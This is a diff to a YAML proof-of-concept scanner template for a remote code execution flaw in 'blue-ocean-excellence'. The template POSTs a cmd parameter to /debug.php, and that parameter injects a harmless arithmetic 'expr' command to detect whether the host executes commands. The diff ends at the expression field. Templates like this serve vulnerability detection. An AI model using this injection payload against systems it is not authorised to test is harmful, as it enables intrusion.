@@ -1,12 +1,11 @@
 name: poc-yaml-blue-ocean-excellence-rce
 set:
-  r1: randomInt(40000, 42800)
-  r2: randomInt(40000, 42800)
+  r1: randomInt(40000, 40800)
+  r2: randomInt(40000, 40800)
 rules:
   - method: POST
-      path: /debug.php
-      follow_redirects: false
-      body: |
+    path: /debug.php
+    body: |
         cmd=expr%20{{r1}}%20%2b%20{{r2}}
     follow_redirects: false
     expression: |
